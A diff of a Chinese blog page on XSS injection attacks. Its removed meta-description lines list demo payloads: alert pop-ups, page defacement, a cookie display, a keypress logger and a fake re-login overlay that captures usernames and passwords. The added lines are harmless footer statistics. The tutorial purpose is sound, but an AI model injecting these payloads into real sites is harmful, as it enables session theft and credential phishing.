@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="xss攻击 示例：网络留言板 示例网站：网络安全演示 - 留言板\nxss攻击，日常弹窗alert()只是我们测试危害的一种方式\nxss攻击的本质，是让人家的浏览器去因为你找到的网站漏洞去运行恶意js代码\n测试弹窗，有很多时候弹窗种类多种多样\n下面是示例注入代码：\njs弹窗 1 &lt;script&gt;alert(1)&lt;/script&gt; 基于图片报错弹窗 1 &lt;img src=x onerror=&#34;alert(1)&#34; /&gt; 基于图片报错篡改网页 1 &lt;img src=x onerror=&#34;document.body.innerHTML=&#39;&lt;h1 style=color:red;padding:50px;&gt;haha wocao&lt;/h1&gt;&#39;&#34; /&gt; 基于矢量图网页加载时弹窗 1 &lt;svg onload=&#34;alert(1)&#34; /&gt; 基于iframe容器网页加载时弹窗 1 &lt;iframe onload=&#34;alert(1)&#34;&gt;&lt;/iframe&gt; 基于iframe容器在网页中加载其他网页 1 &lt;iframe src=&#34;https://www.baidu.com&#34; onload=&#34;alert(1)&#34;&gt;&lt;/iframe&gt; 鼠标掠过时弹窗 1 &lt;div onmouseover=&#34;alert(1)&#34;&gt;点我抽奖&lt;/div&gt; 基于图片报错弹窗cookie信息 1 &lt;img src=x onerror=&#34;alert(&#39;Cookie: &#39; + document.cookie)&#34;&gt; 基于图片报错的键盘检测 1 &lt;img src=x onerror=&#34;document.addEventListener(&#39;keypress&#39;,function(e){console.log(&#39;按键:&#39;+e.key)});&#34;&gt; 基于图片报错的伪装登录页面 1 &lt;img src=x onerror=&#34;var d=document;d.body.innerHTML=&#39;&lt;div style=position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center&gt;&lt;div style=background:white;padding:30px;border-radius:10px;text-align:center&gt;&lt;h2&gt;系统提示&lt;/h2&gt;&lt;p&gt;您的账户存在异常，请重新登录&lt;/p&gt;&lt;input type=text placeholder=用户名 id=u style=margin:10px;padding:10px;width:200px&gt;&lt;input type=password placeholder=密码 id=p style=margin:10px;padding:10px;width:200px&gt;&lt;button onclick=var u=document.getElementById(String.fromCharCode(117));var p=document.getElementById(String.fromCharCode(112));alert(String.fromCharCode(29992,25143,21517,58)+u.value+String.fromCharCode(10,23494,30721,58)+p.value);this.parentElement.parentElement.remove() style=margin:10px;padding:10px 20px;background:#667eea;color:white;border:none;border-radius:5px;cursor:pointer&gt;登录&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&#39;&#34;&gt; 练习题 链接：练习靶场\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="xss攻击 示例：网络留言板 示例网站：网络安全演示 - 留言板\nxss攻击，日常弹窗alert()只是我们测试危害的一种方式\nxss攻击的本质，是让人家的浏览器去因为你找到的网站漏洞去运行恶意js代码\n">
 <title>1.18 XSS注入攻击</title>
 
 <link rel='canonical' href='https://www.retr0.xyz/p/1.18-xss%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/'>
 
-<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="1.18 XSS注入攻击">
-<meta property='og:description' content="xss攻击 示例：网络留言板 示例网站：网络安全演示 - 留言板\nxss攻击，日常弹窗alert()只是我们测试危害的一种方式\nxss攻击的本质，是让人家的浏览器去因为你找到的网站漏洞去运行恶意js代码\n测试弹窗，有很多时候弹窗种类多种多样\n下面是示例注入代码：\njs弹窗 1 &lt;script&gt;alert(1)&lt;/script&gt; 基于图片报错弹窗 1 &lt;img src=x onerror=&#34;alert(1)&#34; /&gt; 基于图片报错篡改网页 1 &lt;img src=x onerror=&#34;document.body.innerHTML=&#39;&lt;h1 style=color:red;padding:50px;&gt;haha wocao&lt;/h1&gt;&#39;&#34; /&gt; 基于矢量图网页加载时弹窗 1 &lt;svg onload=&#34;alert(1)&#34; /&gt; 基于iframe容器网页加载时弹窗 1 &lt;iframe onload=&#34;alert(1)&#34;&gt;&lt;/iframe&gt; 基于iframe容器在网页中加载其他网页 1 &lt;iframe src=&#34;https://www.baidu.com&#34; onload=&#34;alert(1)&#34;&gt;&lt;/iframe&gt; 鼠标掠过时弹窗 1 &lt;div onmouseover=&#34;alert(1)&#34;&gt;点我抽奖&lt;/div&gt; 基于图片报错弹窗cookie信息 1 &lt;img src=x onerror=&#34;alert(&#39;Cookie: &#39; + document.cookie)&#34;&gt; 基于图片报错的键盘检测 1 &lt;img src=x onerror=&#34;document.addEventListener(&#39;keypress&#39;,function(e){console.log(&#39;按键:&#39;+e.key)});&#34;&gt; 基于图片报错的伪装登录页面 1 &lt;img src=x onerror=&#34;var d=document;d.body.innerHTML=&#39;&lt;div style=position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center&gt;&lt;div style=background:white;padding:30px;border-radius:10px;text-align:center&gt;&lt;h2&gt;系统提示&lt;/h2&gt;&lt;p&gt;您的账户存在异常，请重新登录&lt;/p&gt;&lt;input type=text placeholder=用户名 id=u style=margin:10px;padding:10px;width:200px&gt;&lt;input type=password placeholder=密码 id=p style=margin:10px;padding:10px;width:200px&gt;&lt;button onclick=var u=document.getElementById(String.fromCharCode(117));var p=document.getElementById(String.fromCharCode(112));alert(String.fromCharCode(29992,25143,21517,58)+u.value+String.fromCharCode(10,23494,30721,58)+p.value);this.parentElement.parentElement.remove() style=margin:10px;padding:10px 20px;background:#667eea;color:white;border:none;border-radius:5px;cursor:pointer&gt;登录&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&#39;&#34;&gt; 练习题 链接：练习靶场\n">
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.18 XSS注入攻击">
+<meta property='og:description' content="xss攻击 示例：网络留言板 示例网站：网络安全演示 - 留言板\nxss攻击，日常弹窗alert()只是我们测试危害的一种方式\nxss攻击的本质，是让人家的浏览器去因为你找到的网站漏洞去运行恶意js代码\n">
 <meta property='og:url' content='https://www.retr0.xyz/p/1.18-xss%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/'>
 <meta property='og:site_name' content='Retr0的小窝'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-18T20:42:00&#43;08:00'/><meta property='article:modified_time' content='2026-01-18T20:42:00&#43;08:00'/>
 <meta name="twitter:title" content="1.18 XSS注入攻击">
-<meta name="twitter:description" content="xss攻击 示例：网络留言板 示例网站：网络安全演示 - 留言板\nxss攻击，日常弹窗alert()只是我们测试危害的一种方式\nxss攻击的本质，是让人家的浏览器去因为你找到的网站漏洞去运行恶意js代码\n测试弹窗，有很多时候弹窗种类多种多样\n下面是示例注入代码：\njs弹窗 1 &lt;script&gt;alert(1)&lt;/script&gt; 基于图片报错弹窗 1 &lt;img src=x onerror=&#34;alert(1)&#34; /&gt; 基于图片报错篡改网页 1 &lt;img src=x onerror=&#34;document.body.innerHTML=&#39;&lt;h1 style=color:red;padding:50px;&gt;haha wocao&lt;/h1&gt;&#39;&#34; /&gt; 基于矢量图网页加载时弹窗 1 &lt;svg onload=&#34;alert(1)&#34; /&gt; 基于iframe容器网页加载时弹窗 1 &lt;iframe onload=&#34;alert(1)&#34;&gt;&lt;/iframe&gt; 基于iframe容器在网页中加载其他网页 1 &lt;iframe src=&#34;https://www.baidu.com&#34; onload=&#34;alert(1)&#34;&gt;&lt;/iframe&gt; 鼠标掠过时弹窗 1 &lt;div onmouseover=&#34;alert(1)&#34;&gt;点我抽奖&lt;/div&gt; 基于图片报错弹窗cookie信息 1 &lt;img src=x onerror=&#34;alert(&#39;Cookie: &#39; + document.cookie)&#34;&gt; 基于图片报错的键盘检测 1 &lt;img src=x onerror=&#34;document.addEventListener(&#39;keypress&#39;,function(e){console.log(&#39;按键:&#39;+e.key)});&#34;&gt; 基于图片报错的伪装登录页面 1 &lt;img src=x onerror=&#34;var d=document;d.body.innerHTML=&#39;&lt;div style=position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center&gt;&lt;div style=background:white;padding:30px;border-radius:10px;text-align:center&gt;&lt;h2&gt;系统提示&lt;/h2&gt;&lt;p&gt;您的账户存在异常，请重新登录&lt;/p&gt;&lt;input type=text placeholder=用户名 id=u style=margin:10px;padding:10px;width:200px&gt;&lt;input type=password placeholder=密码 id=p style=margin:10px;padding:10px;width:200px&gt;&lt;button onclick=var u=document.getElementById(String.fromCharCode(117));var p=document.getElementById(String.fromCharCode(112));alert(String.fromCharCode(29992,25143,21517,58)+u.value+String.fromCharCode(10,23494,30721,58)+p.value);this.parentElement.parentElement.remove() style=margin:10px;padding:10px 20px;background:#667eea;color:white;border:none;border-radius:5px;cursor:pointer&gt;登录&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&#39;&#34;&gt; 练习题 链接：练习靶场\n">
+<meta name="twitter:description" content="xss攻击 示例：网络留言板 示例网站：网络安全演示 - 留言板\nxss攻击，日常弹窗alert()只是我们测试危害的一种方式\nxss攻击的本质，是让人家的浏览器去因为你找到的网站漏洞去运行恶意js代码\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -962,11 +962,228 @@
     <section class="copyright">
         &copy; 
         
-            2024 - 
+            2025 - 
         
         2026 Retr0
     </section>
     
+    <section class="running-time">
+    已存在于互联网
+    <span id="runningdays" class="running-days"></span>
+    </section>
+    
+    <section class="totalcount">
+        
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+        发表了95篇文章 · 
+        总计131.27k字
+    </section>
+
+
     <section class="powerby">
         
             Powered by ctOS <br/>
@@ -1654,6 +1871,21 @@ function destroyArticlePlayers() {
 document.addEventListener('pjax:send', () => {
     destroyArticlePlayers();
 });
+</script>
+
+
+<script>
+    let s1 = '2025-10-26'; 
+    s1 = new Date(s1.replace(/-/g, "/"));
+    let s2 = new Date();
+    let timeDifference = s2.getTime() - s1.getTime();
+
+    let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
+    let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
+
+    let result = days + "天" + hours + "小时" + minutes + "分钟";
+    document.getElementById('runningdays').innerHTML = result;
 </script>
 
 
